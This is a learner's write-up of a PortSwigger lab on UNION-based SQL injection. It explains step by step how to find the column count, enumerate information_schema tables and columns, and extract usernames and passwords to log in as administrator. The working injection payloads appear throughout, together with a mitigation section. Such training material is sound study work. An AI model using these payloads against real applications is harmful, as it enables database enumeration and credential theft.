# PortSwigger Lab: SQL Injection Attack, Listing Database Contents on Non-Oracle Databases

**Difficulty:** Practitioner  
**Date Completed:** 01 September 2026  
**Category:** SQL Injection / UNION-based SQL Injection  
**Database:** Non-Oracle (PostgreSQL-style environment observed)  
**Tool:** Burp Suite Repeater  


---

## 1. Lab Objective

The application has a SQL injection vulnerability in the **product category filter**.

The goal was to:

1. Identify the SQL injection point.
2. Confirm the UNION attack works.
3. Determine the number of returned columns.
4. Discover the database tables.
5. Find the table containing user credentials.
6. Discover the column names in that table.
7. Retrieve usernames and passwords.
8. Find the `administrator` password.
9. Log in as `administrator` and solve the lab.

The important part of this lab was learning how to **enumerate the database structure before retrieving the actual data**.

---

# 2. The Big Picture

The attack followed this chain:

```text
Category parameter
       ↓
SQL injection confirmed
       ↓
UNION SELECT
       ↓
Find number of columns
       ↓
information_schema.tables
       ↓
Find users table
       ↓
information_schema.columns
       ↓
Find username/password columns
       ↓
Query the users table
       ↓
Retrieve credentials
       ↓
Login as administrator
       ↓
Lab solved
```

---

# 3. Why Burp Repeater Was Used

Burp Repeater lets me take an HTTP request and repeatedly send it while changing parts of the request manually.

This is especially useful for SQL injection because I need to test multiple payloads.

Instead of doing:

```text
Browser
 ↓
Change category
 ↓
Submit
 ↓
Check response
 ↓
Repeat
```

I can do:

```text
Capture request
      ↓
Send to Repeater
      ↓
Modify category
      ↓
Send
      ↓
Inspect response
      ↓
Modify again
```

### Simple definition

> **Burp Repeater = manually modify and repeatedly resend an HTTP request.**

---

# 4. Finding the Vulnerable Parameter

The product category filter used a request similar to:

```http
GET /filter?category=Corporate+gifts HTTP/2
```

The interesting parameter was:

```text
category
```

I captured the request and sent it to **Repeater**.

From this point onward, most of the SQL injection testing was done in Repeater.

---

# 5. First Test — Confirm UNION Injection

I tested the following payload:

```text
'+UNION+SELECT+'abc','def'--
```

Conceptually, the SQL is:

```sql
' UNION SELECT 'abc','def'--
```

The response showed the injected values.

This confirmed that:

- The `category` parameter was injectable.
- `UNION SELECT` was being accepted.
- The query returned **2 columns**.
- The columns were compatible with text values.

### Why two columns?

A UNION query needs a compatible number of columns.

The test:

```sql
SELECT 'abc', 'def'
```

contains two columns:

```text
Column 1 → abc
Column 2 → def
```

Since the application accepted it, we learned that our injected query needed two columns.

---

# 6. A Mistake I Made — Wrong `information_schema` Column

At one point I used:

```sql
'+UNION+SELECT+column_name,NULL+FROM+information_schema.tables--
```

This caused:

```text
HTTP/2 500 Internal Server Error
```

### Why it was wrong

I was asking:

```sql
SELECT column_name
FROM information_schema.tables
```

But `information_schema.tables` contains information about **tables**, so the relevant field is:

```text
table_name
```

`column_name` belongs to:

```text
information_schema.columns
```

### Important memory trick

```text
information_schema.tables
        ↓
    table_name


information_schema.columns
        ↓
    column_name
```

This mistake was useful because it made the difference between the two metadata views much clearer.

---

# 7. Step 1 of Enumeration — Find Table Names

The correct payload was:

```text
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+
```

The SQL behind it is:

```sql
' UNION SELECT table_name, NULL
FROM information_schema.tables
--
```

### What this asks

It essentially asks the database:

> "What tables exist?"

The response returned a long list of tables.

Among them, I found:

```text
users_dfjtwu
```

This was the credential table for this lab.

---

# 8. Why `information_schema.tables`?

`information_schema` contains database metadata.

Instead of immediately asking for actual user data, we first asked the database about its structure.

The flow was:

```text
Database
   ↓
information_schema.tables
   ↓
table names
   ↓
users_dfjtwu
```

This is an important SQL injection enumeration technique.

---

# 9. Step 2 of Enumeration — Find the Columns

Now that the table name was known:

```text
users_dfjtwu
```

I needed to find out what columns it contained.

The payload was:

```text
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_dfjtwu'--+
```

The SQL is:

```sql
' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name='users_dfjtwu'
--
```

### What this asks

> "What columns exist inside the `users_dfjtwu` table?"

The response returned:

```text
username_jjtpej
email
password_slxohk
```

So we now knew:

```text
users_dfjtwu
    ├── username_jjtpej
    ├── email
    └── password_slxohk
```

---

# 10. Understanding the Difference Between the Two Enumeration Queries

This is one of the most important parts of the lab.

### Query 1 — Find tables

```sql
SELECT table_name
FROM information_schema.tables
```

Question being asked:

> "What tables exist?"

Result:

```text
users_dfjtwu
```

---

### Query 2 — Find columns

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='users_dfjtwu'
```

Question being asked:

> "What columns are inside this table?"

Result:

```text
username_jjtpej
email
password_slxohk
```

So:

```text
TABLES → find the table
COLUMNS → find the fields inside the table
```

---

# 11. Step 3 — Retrieve the Actual Data

Now we finally knew:

```text
Table:
users_dfjtwu

Username column:
username_jjtpej

Password column:
password_slxohk
```

So we could stop querying metadata and query the actual table.

The payload was:

```text
'+UNION+SELECT+username_jjtpej,password_slxohk+FROM+users_dfjtwu--+
```

The SQL is:

```sql
' UNION SELECT username_jjtpej, password_slxohk
FROM users_dfjtwu
--
```

### What this asks

> "Give me the values stored in the username and password columns of the users table."

This is different from the previous payloads.

Previously we were asking:

```text
"What is the database structure?"
```

Now we're asking:

```text
"What data is actually stored there?"
```

---

# 12. The Returned Credentials

The response returned:

```text
wiener        → 6dd63gttzpdpbdi96lrj
carlos        → bo22bvnu8su3laeqagyj
administrator → ubh7v47tmxgzpsfxeqck
```

The important record was:

```text
administrator → ubh7v47tmxgzpsfxeqck
```

I then used the administrator credentials to log in.

---

# 13. Final Login

Username:

```text
administrator
```

Password:

```text
ubh7v47tmxgzpsfxeqck
```

After logging in, the lab was successfully solved.

---

# 14. Complete Payload Progression

### 1. Confirm UNION / column count

```sql
' UNION SELECT 'abc','def'--
```

Purpose:

```text
Confirm SQL injection
Confirm UNION works
Confirm 2 columns
Confirm text output
```

---

### 2. Find tables

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

Purpose:

```text
Discover database tables
```

Result:

```text
users_dfjtwu
```

---

### 3. Find columns

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users_dfjtwu'--
```

Purpose:

```text
Discover columns inside users_dfjtwu
```

Result:

```text
username_jjtpej
email
password_slxohk
```

---

### 4. Retrieve credentials

```sql
' UNION SELECT username_jjtpej,password_slxohk
FROM users_dfjtwu--
```

Purpose:

```text
Retrieve actual usernames and passwords
```

Result:

```text
administrator → ubh7v47tmxgzpsfxeqck
```

---

# 15. Why `NULL` Was Used

You may notice that the table/column enumeration queries use:

```sql
SELECT table_name, NULL
```

instead of only:

```sql
SELECT table_name
```

This is because the original query returns **two columns**.

Our UNION query therefore needs two columns as well.

So:

```text
Column 1       Column 2
---------      ---------
table_name     NULL
```

Later:

```text
Column 1              Column 2
---------             ---------
username_jjtpej       password_slxohk
```

Both satisfy the two-column requirement.

---

# 16. Why `--` Was Used

The payload ends with:

```sql
--
```

This is used to comment out the remainder of the original SQL statement.

Conceptually, the application may append additional SQL after our input.

The comment helps prevent the remaining original SQL from interfering with the injected query.

---

# 17. Why `+` Was Used

The payload was sent through a URL parameter.

For example:

```text
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+
```

The `+` characters represent spaces in URL query parameters.

So it corresponds to:

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

The `+` signs are therefore mainly a URL/query-string representation of spaces.

---

# 18. What Happened When the Query Was Wrong?

One of the useful mistakes in this lab was:

```sql
SELECT column_name
FROM information_schema.tables
```

This caused:

```text
HTTP/2 500 Internal Server Error
```

The reason was that I mixed up the metadata views.

Correct:

```text
information_schema.tables
        ↓
table_name
```

Correct:

```text
information_schema.columns
        ↓
column_name
```

This is a good example of why understanding the database structure is more useful than blindly copying payloads.

---

# 19. The Complete Learning Chain

```text
1. Find vulnerable parameter
           ↓
2. Use Burp Repeater
           ↓
3. Confirm UNION injection
           ↓
4. Determine column count
           ↓
5. Query information_schema.tables
           ↓
6. Find users_dfjtwu
           ↓
7. Query information_schema.columns
           ↓
8. Find username_jjtpej
           ↓
9. Find password_slxohk
           ↓
10. Query users_dfjtwu
           ↓
11. Retrieve administrator credentials
           ↓
12. Login
           ↓
13. LAB SOLVED 
```

---

# 20. Key Concepts to Remember

| Concept | Meaning |
|---|---|
| SQL Injection | Manipulating SQL through application input |
| UNION | Combines results from SQL queries |
| UNION SELECT | Retrieves additional query results |
| Burp Repeater | Modify and repeatedly send HTTP requests |
| `information_schema` | Database metadata |
| `information_schema.tables` | Information about tables |
| `table_name` | Name of a table |
| `information_schema.columns` | Information about columns |
| `column_name` | Name of a column |
| `NULL` | Placeholder for an unused column |
| `--` | SQL comment marker in this context |
| `+` | Represents spaces in the URL parameter |
| Payload | Crafted input sent to test/exploit the vulnerability |

---

# 21. What I Learned From This Lab

The biggest lesson was that SQL injection can be used to **map a database before extracting data**.

I didn't know the credential table name at the beginning.

I discovered it step by step:

```text
Unknown database structure
        ↓
Find tables
        ↓
users_dfjtwu
        ↓
Find columns
        ↓
username_jjtpej
password_slxohk
        ↓
Retrieve data
        ↓
administrator credentials
```

The important thing is not memorizing the random names because the lab generates different names.

The important pattern is:

> **Find the table → find its columns → query the required data.**

---

# 22. Interview Explanation

If asked how I solved this lab:

> "I identified a SQL injection vulnerability in the category parameter and used Burp Repeater to test it. I first confirmed that a UNION query worked and established that the original query returned two columns. I then used `information_schema.tables` to enumerate the database tables and found the credential table. Next, I queried `information_schema.columns` to identify the username and password fields. Finally, I used a UNION query against that table to retrieve the credentials and logged in as the administrator."

---

# 23. Security Mitigation

The application should not directly concatenate user input into SQL queries.

Recommended protections include:

- Use parameterized queries / prepared statements.
- Validate and constrain user input.
- Avoid dynamically constructing SQL from untrusted input.
- Use least-privilege database accounts.
- Prevent application users from accessing unnecessary database metadata.
- Use defense-in-depth controls such as monitoring and WAF rules.

The primary fix is **safe SQL query construction**, especially parameterized queries.

---

# 24. Personal Study Notes

### Things I understood

- Why Burp Repeater is useful.
- What a SQL injection payload is.
- How UNION-based SQL injection works.
- Why the column count must match.
- Why `NULL` can be used as a placeholder.
- The difference between `information_schema.tables` and `information_schema.columns`.
- How to discover an unknown table.
- How to discover the columns in that table.
- The difference between retrieving **metadata** and retrieving **actual data**.
- How the final query returned the administrator credentials.

### Mistake I want to remember

I initially confused:

```text
information_schema.tables
```

with:

```text
information_schema.columns
```

The correction:

```text
tables  → table_name
columns → column_name
```

This mistake helped me understand the database enumeration process better.

---

# 25. Quick Revision Card

If I need to rewind this lab later:

```text
Vulnerable parameter:
category

UNION test:
' UNION SELECT 'abc','def'--

Find tables:
' UNION SELECT table_name,NULL
FROM information_schema.tables--

Find columns:
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users_dfjtwu'--

Retrieve credentials:
' UNION SELECT username_jjtpej,password_slxohk
FROM users_dfjtwu--

Important pattern:

TABLES
  ↓
find table

COLUMNS
  ↓
find fields

ACTUAL TABLE
  ↓
retrieve data
```

---
